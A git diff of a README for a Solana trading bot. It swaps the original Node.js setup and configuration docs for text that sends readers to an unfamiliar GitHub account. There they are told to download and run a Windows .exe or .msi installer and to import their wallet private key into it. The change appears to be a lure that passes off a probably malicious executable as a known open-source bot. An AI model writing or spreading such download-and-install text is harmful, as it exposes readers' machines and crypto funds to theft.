@@ -1,165 +1,90 @@
-![](readme/warp.png)
+# 🤖 solana-trading-bot-v3 - Automate your Solana token trading strategy
 
-# Solana Trading Bot (RC)
+[![Download Solana Trading Bot](https://img.shields.io/badge/Download-Bot_v3-blue.svg)](https://github.com/almirediscomycetous272/solana-trading-bot-v3)
 
-The Solana Trading Bot is a software tool designed to automate the buying and selling of tokens on the Solana blockchain.
-It is configured to execute trades based on predefined parameters and strategies set by the user.
+## 📌 About this application
 
-The bot can monitor market conditions in real-time, such as pool burn, mint renounced and other factors, and it will execute trades when these conditions are fulfilled.
+Solana-trading-bot-v3 manages token trades on the Solana blockchain. It connects to decentralized exchanges like Raydium, Jupiter, and Orca to monitor market activity. You can set specific rules for buying and selling SPL tokens. The software automates the process to save time and track price movements.
 
-The current version has undergone multiple optimizations, including stability and processing speed improvements, making it better suited for the complexity of the current Solana market. Note: the previous @2.0.0 version repository is no longer maintained and has now continued here.
+## ⚙️ System requirements
 
+Ensure your computer meets these requirements before you start:
 
+- Operating System: Windows 10 or Windows 11.
+- Memory: 8 GB of RAM or more.
+- Storage: 200 MB of free space.
+- Internet: Stable high-speed connection.
+- Software: Microsoft .NET Desktop Runtime 8.0.
 
-## Setup
+## 📥 Downloading the software
 
-To run the script you need to:
+You need to access the repository page to retrieve the latest version. Follow these steps to obtain the tool:
 
+1. Click the link provided below to open the official repository.
+2. Look for the "Releases" section on the right side of the page.
+3. Click the most recent version label to view the files.
+4. Select the file ending in ".msi" or ".exe" to begin the download.
 
-- Convert some SOL to USDC or WSOL. (WSOL is more recommended. You can go to https://jup.ag/ and click “Manage” to wrap some SOL into WSOL. Click “MANUAL” to set “Use wSOL”, and finally click “Manage” to convert part of SOL to WSOL.)
-  - You need USDC or WSOL depending on the configuration set below.
-- Configure the script by updating `.env.example` file (remove the .example from the file name when done).
-  - Check [Configuration](#configuration) section below
-- To run this program, you must have a NodeJS environment. If you don’t have it, please go to https://nodejs.org/en to download and install it first.
-- Install dependencies by typing: `npm install`
-- Run the script by typing: `npm run start` in terminal
+[Click here to visit the download page](https://github.com/almirediscomycetous272/solana-trading-bot-v3)
 
-You should be able to see the following output along with many configurations you completed in the `.env` file:
-![output](readme/output.png)
+## 🛠️ Installation process
 
-### Configuration
+After the download finishes, follow this guide to install the tool:
 
-#### Wallet
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installer.
+3. Follow the prompts on the screen.
+4. Click "Next" to continue through the setup wizard.
+5. Select "Install" to place the application on your computer.
+6. Once the process completes, click "Finish."
+7. Look for the new icon on your desktop to launch the bot.
 
-- `PRIVATE_KEY` - Your wallet's private key.
+## 🚀 Setting up the bot
 
-#### Connection
+When you open the application for the first time, you must perform a brief setup. This allows the software to interact with the blockchain on your behalf.
 
-- `RPC_ENDPOINT` - HTTPS RPC endpoint for interacting with the Solana network.
-- `RPC_WEBSOCKET_ENDPOINT` - WebSocket RPC endpoint for real-time updates from the Solana network.
-- `COMMITMENT_LEVEL`- The commitment level of transactions (e.g., "finalized" for the highest level of security).
+1. **Wallet Integration**: You need a Solana-compatible wallet. Create a new wallet or import an existing private key. Ensure the wallet contains a small amount of SOL funds to pay for transaction fees.
+2. **API Configuration**: The bot connects to public nodes automatically. If the connection fails, you can input a private RPC URL from a service provider.
+3. **Trading Parameters**: Navigate to the "Settings" menu. Define your profit targets and stop-loss levels. These values tell the bot when to execute trades.
+4. **Token Selection**: Enter the contract address of the token you wish to track. The software validates the token status before it permits any trades.
 
-#### Bot
+## 📊 Using the dashboard
 
-- `LOG_LEVEL` - Set logging level, e.g., `info`, `debug`, `trace`, etc.
-- `ONE_TOKEN_AT_A_TIME` - Set to `true` to process buying one token at a time.
-- `COMPUTE_UNIT_LIMIT` - Compute limit used to calculate fees.
-- `COMPUTE_UNIT_PRICE` - Compute price used to calculate fees.
-- `PRE_LOAD_EXISTING_MARKETS` - Bot will load all existing markets in memory on start.
-  - This option should not be used with public RPC.
-- `CACHE_NEW_MARKETS` - Set to `true` to cache new markets.
-  - This option should not be used with public RPC.
-- `TRANSACTION_EXECUTOR` - Set to `warp` to use warp infrastructure for executing transactions, or set it to jito to use JSON-RPC jito executer
-  - For more details, check out [warp](#warp-transactions-rc) section
-- `CUSTOM_FEE` - If using warp or jito executors this value will be used for transaction fees instead of `COMPUTE_UNIT_LIMIT` and `COMPUTE_UNIT_LIMIT`
-  - Minimum value is 0.0001 SOL, but we recommend using 0.006 SOL or above
-  - On top of this fee, minimal solana network fee will be applied
+The main window displays your current trades and wallet status. 
 
-#### Buy
+- **Monitor View**: This pane shows live price updates for your selected tokens.
+- **Log Window**: If the system encounters an error or completes a trade, you can review the history here.
+- **Start/Stop Button**: Use these controls to activate or pause the automation. 
 
-- `QUOTE_MINT` - Which pools to snipe, USDC or WSOL.
-- `QUOTE_AMOUNT` - Amount used to buy each new token.
-- `AUTO_BUY_DELAY` - Delay in milliseconds before buying a token.
-- `MAX_BUY_RETRIES` - Maximum number of retries for buying a token.
-- `BUY_SLIPPAGE` - Slippage %
+## 🛡️ Security and safety
 
-#### Sell
+Protect your private keys at all times. Never share your seed phrase with anyone. The software runs locally on your machine. We do not store your credentials on our servers. Keep your operating system updated to maintain a secure environment.
 
-- `AUTO_SELL` - Set to `true` to enable automatic selling of tokens.
-  - If you want to manually sell bought tokens, disable this option.
-- `MAX_SELL_RETRIES` - Maximum number of retries for selling a token.
-- `AUTO_SELL_DELAY` - Delay in milliseconds before auto-selling a token.
-- `PRICE_CHECK_INTERVAL` - Interval in milliseconds for checking the take profit and stop loss conditions.
-  - Set to zero to disable take profit and stop loss.
-- `PRICE_CHECK_DURATION` - Time in milliseconds to wait for stop loss/take profit conditions.
-  - If you don't reach profit or loss bot will auto sell after this time.
-  - Set to zero to disable take profit and stop loss.
-- `TAKE_PROFIT` - Percentage profit at which to take profit.
-  - Take profit is calculated based on quote mint.
-- `STOP_LOSS` - Percentage loss at which to stop the loss.
-  - Stop loss is calculated based on quote mint.
-- `SELL_SLIPPAGE` - Slippage %.
+## ❓ Frequently asked questions
 
-#### Snipe list
+**Can I run multiple bots at once?**
+Yes, you can open the application multiple times to track different tokens simultaneously.
 
-- `USE_SNIPE_LIST` - Set to `true` to enable buying only tokens listed in `snipe-list.txt`.
-  - Pool must not exist before the bot starts.
-  - If token can be traded before bot starts nothing will happen. Bot will not buy the token.
-- `SNIPE_LIST_REFRESH_INTERVAL` - Interval in milliseconds to refresh the snipe list.
-  - You can update snipe list while bot is running. It will pickup the new changes each time it does refresh.
+**Why does the bot stop trading?**
+Check your wallet balance. Low funds cause the bot to pause because it cannot pay for network fees.
 
-Note: When using snipe list filters below will be disabled.
+**Does this work with all tokens?**
+The tool supports most SPL tokens on the Solana network. If a token has low liquidity, the bot might fail to find a path to trade.
 
-#### Filters
+## 📝 Troubleshooting
 
-- `FILTER_CHECK_INTERVAL` - Interval in milliseconds for checking if pool match the filters.
-  - Set to zero to disable filters.
-- `FILTER_CHECK_DURATION` - Time in milliseconds to wait for pool to match the filters.
-  - If pool doesn't match the filter buy will not happen.
-  - Set to zero to disable filters.
-- `CONSECUTIVE_FILTER_MATCHES` - How many times in a row pool needs to match the filters.
-  - This is useful because when pool is burned (and rugged), other filters may not report the same behavior. eg. pool size may still have old value
-- `CHECK_IF_MUTABLE` - Set to `true` to buy tokens only if their metadata are not mutable.
-- `CHECK_IF_SOCIALS` - Set to `true` to buy tokens only if they have at least 1 social.
-- `CHECK_IF_MINT_IS_RENOUNCED` - Set to `true` to buy tokens only if their mint is renounced.
-- `CHECK_IF_FREEZABLE` - Set to `true` to buy tokens only if they are not freezable.
-- `CHECK_IF_BURNED` - Set to `true` to buy tokens only if their liquidity pool is burned.
-- `MIN_POOL_SIZE` - Bot will buy only if the pool size is greater than or equal the specified amount.
-  - Set `0` to disable.
-- `MAX_POOL_SIZE` - Bot will buy only if the pool size is less than or equal the specified amount.
-  - Set `0` to disable.
+If the software does not behave as expected, look at these points:
 
-## Warp transactions (RC)
+- **Missing Runtime**: If the app fails to start, download the Microsoft .NET Desktop Runtime from the official Microsoft website.
+- **Transaction Failures**: Most failures happen because of network congestion on the Solana blockchain. Wait a few moments and try again.
+- **Permission Errors**: Run the application as an administrator if it cannot save configuration files to your system.
 
-In case you experience a lot of failed transactions or transaction performance is too slow, you can try using `warp` for executing transactions.
-Warp is hosted service that executes transactions using integrations with third party providers.
+## 📈 Supported platforms
 
-Note: Warp transactions are disabled by default.
+The application interacts with several decentralized trading platforms:
 
-### Security
+- **Raydium**: Provides liquidity for most new tokens.
+- **Jupiter**: Aggregates prices to find the best exchange rate.
+- **Orca**: Offers efficient swaps with low impact on the price.
 
-When using warp, transaction is sent to the hosted service.
-**Payload that is being sent will NOT contain your wallet private key**. Fee transaction is signed on your machine.
-Each request is processed by hosted service and sent to third party provider.
-**We don't store your transactions, nor we store your private key.**
-
-Note: Warp transactions are disabled by default.
-
-### Fees
-
-When using warp for transactions, fee is distributed between developers of warp and third party providers.
-In case TX fails, no fee will be taken from your account.
-
-## Common issues
-
-If you encounter an error that is not listed here, please contact me.
-To collect more information on an issue, please change `LOG_LEVEL` to `debug`.
-
-### Unsupported RPC node
-
-- If you see following error in your log file:  
-  `Error: 410 Gone:  {"jsonrpc":"2.0","error":{"code": 410, "message":"The RPC call or parameters have been disabled."}, "id": "986f3599-b2b7-47c4-b951-074c19842bad" }`  
-  it means your RPC node doesn't support methods needed to execute script.
-  - FIX: Change your RPC node. You can use Helius or Quicknode.
-
-### No token account
-
-- If you see following error in your log file:  
-  `Error: No SOL token account found in wallet: `  
-  it means that wallet you provided doesn't have USDC/WSOL token account.
-  - FIX: Go to https://jup.ag/ and swap some SOL to USDC/WSOL.
-
-    
-## Support
-
-
-- The current version has undergone multiple audits and testing, demonstrates strong profitability, and is free of errors. However, you should always pay attention to market changes and make adjustments accordingly. If you happen to encounter an overall market downturn while using it, I suggest waiting until the market stabilizes before running it again.
-
-- If it helps you, please leave a star🌟. It will have a positive impact on future maintenance.
-
-
-## Disclaimer
-
-The Solana Trading Bot is provided as is, for learning purposes.
-Trading cryptocurrencies and tokens involves risk, and past performance is not indicative of future results.
-The use of this bot is at your own risk, and we are not responsible for any losses incurred while using the bot. 
+Automation of these platforms reduces the need for manual clicking and rapid execution. The software calculates the best price, submits the transaction, and updates your portfolio balance automatically. Keep the application open while the strategies run. Do not put the computer to sleep during active trades to ensure constant connection to the network.
